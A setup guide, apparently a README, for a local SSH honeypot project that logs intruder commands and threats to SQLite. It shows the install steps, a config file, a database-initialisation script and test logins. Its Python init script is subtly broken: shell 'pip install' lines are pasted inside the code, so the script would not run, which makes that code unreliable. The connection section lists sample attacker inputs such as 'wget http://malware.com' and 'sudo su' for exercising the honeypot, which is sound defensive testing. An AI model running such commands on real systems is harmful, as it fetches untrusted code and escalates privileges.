

# 1️⃣ System Requirements

Sesh must have:

* Python **3.10+**
* Git
* SSH client (already available on Linux/macOS and Windows PowerShell)

Check Python:

```bash
python --version
```

---

# 2️⃣ Clone the Repository

On his laptop:

```bash
git clone <your-repo-url>
cd honeypot-choas
```

---

# 3️⃣ Create Virtual Environment (Recommended)

Linux / macOS:

```bash
python3 -m venv venv
source venv/bin/activate
```

Windows:

```powershell
python -m venv venv
venv\Scripts\activate
```

---

# 4️⃣ Install Required Packages

Create a file in the root:

```
requirements.txt
```

Add:

```txt
paramiko
```

Then install:

```bash
pip install -r requirements.txt
```

SQLite does **not** need installation because it is included in Python.

---

# 5️⃣ Configure Database Path

In your project you already use:

```python
DATABASE_PATH
```

Ensure `core/config.py` contains something like:

```python
import os

BASE_DIR = os.path.dirname(os.path.dirname(__file__))

DATABASE_PATH = os.path.join(BASE_DIR, "database", "honeypot.db")

SSH_HOST = "127.0.0.1"
SSH_PORT = 2222

MAX_COMMAND_LENGTH = 512
SESSION_TIMEOUT_SECONDS = 300
```

---

# 6️⃣ Create the Database

Inside project root:

```
database/
```

Create file:

```
database/init_db.py
```

Use this code:

```python
import sqlite3
from core.config import DATABASE_PATH

pip install dotenv
pip install paramiko
pip install psutil
pip install openai
pip install uvicorn
pip install fastapi

SCHEMA = """
-- SESSIONS
CREATE TABLE IF NOT EXISTS sessions (
    session_id TEXT PRIMARY KEY,
    sensor_id TEXT DEFAULT 'local-node-1',
    source_ip TEXT NOT NULL,
    start_time DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    end_time DATETIME,
    duration_secs INTEGER,
    total_commands INTEGER DEFAULT 0,
    status TEXT DEFAULT 'active' CHECK (status IN ('active', 'closed', 'timeout'))
);

-- COMMANDS
CREATE TABLE IF NOT EXISTS commands (
    command_id INTEGER PRIMARY KEY AUTOINCREMENT,
    session_id TEXT NOT NULL,
    raw_input TEXT NOT NULL,
    parsed_command TEXT,
    timestamp DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    response_type TEXT CHECK (response_type IN ('rule','ai','unknown')),
    response_text TEXT,
    FOREIGN KEY (session_id) REFERENCES sessions(session_id)
);

-- THREATS
CREATE TABLE IF NOT EXISTS threats (
    threat_id INTEGER PRIMARY KEY AUTOINCREMENT,
    session_id TEXT NOT NULL,
    command_id INTEGER NOT NULL,
    threat_type TEXT NOT NULL,
    severity TEXT NOT NULL DEFAULT 'Low' CHECK (severity IN ('Low','Medium','High')),
    confidence REAL NOT NULL DEFAULT 1.0,
    source TEXT DEFAULT 'rule' CHECK (source IN ('rule','ai')),
    timestamp DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    processed INTEGER NOT NULL DEFAULT 0 CHECK (processed IN (0,1)),
    FOREIGN KEY (session_id) REFERENCES sessions(session_id),
    FOREIGN KEY (command_id) REFERENCES commands(command_id)
);

-- CHAOS RESULTS
CREATE TABLE IF NOT EXISTS chaos_results (
    experiment_id INTEGER PRIMARY KEY AUTOINCREMENT,
    threat_id INTEGER NOT NULL,
    experiment_type TEXT NOT NULL CHECK (experiment_type IN ('cpu_stress','memory_stress','disk_io')),
    intensity_level INTEGER DEFAULT 1,
    cpu_peak REAL,
    memory_peak REAL,
    disk_io_peak REAL,
    duration_secs INTEGER,
    recovery_time_secs REAL,
    result TEXT CHECK (result IN ('Resilient','Vulnerable')),
    started_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    completed_at DATETIME,
    notes TEXT,
    FOREIGN KEY (threat_id) REFERENCES threats(threat_id)
);

-- ADAPTIVE SCORES
CREATE TABLE IF NOT EXISTS adaptive_scores (
    session_id TEXT NOT NULL,
    threat_type TEXT NOT NULL,
    occurrence_count INTEGER DEFAULT 0,
    current_severity TEXT DEFAULT 'Low',
    chaos_intensity_level INTEGER DEFAULT 1,
    escalation_triggered INTEGER DEFAULT 0,
    last_updated DATETIME DEFAULT CURRENT_TIMESTAMP,
    PRIMARY KEY (session_id, threat_type),
    FOREIGN KEY (session_id) REFERENCES sessions(session_id)
);
"""

conn = sqlite3.connect(DATABASE_PATH)
conn.executescript(SCHEMA)
conn.close()

print("Database initialized successfully.")
```

---

# 7️⃣ Initialize Database

Run once:

```bash
python database/init_db.py
```

This will create:

```
database/honeypot.db
```

with all tables.

---

# 8️⃣ Start the Honeypot

From project root:

```bash
python -m core.main
```

You should see:

```
SSH Honeypot running on 127.0.0.1:2222
```

---

# 9️⃣ Connect to Honeypot

Open another terminal:

```bash
ssh root@127.0.0.1 -p 2222
```

Example commands:

```
ls
mkdir test
cd test
pwd
wget http://malware.com
sudo su
```

These will be logged in the database.

---

# 🔟 Verify Database Logging

He can check using Python:

```python
import sqlite3
conn = sqlite3.connect("database/honeypot.db")
cursor = conn.cursor()

cursor.execute("SELECT raw_input FROM commands")
print(cursor.fetchall())

conn.close()
```

---

# 1️⃣1️⃣ Important Notes for Sesh

* Each SSH session creates its **own virtual filesystem**
* Commands are logged in **commands table**
* Threats appear in **threats table**
* Chaos engine will later read **unprocessed threats**

---

# 📦 What You Should Add to Repo

Your repository should contain:

```
honeypot-choas
│
├── core/
├── database/
│   └── init_db.py
├── requirements.txt
└── README.md
```

---

# ⭐ Recommendation (Important)

Add to `.gitignore`:

```
database/honeypot.db
__pycache__/
venv/
```

Because the DB should **not be committed to GitHub**.
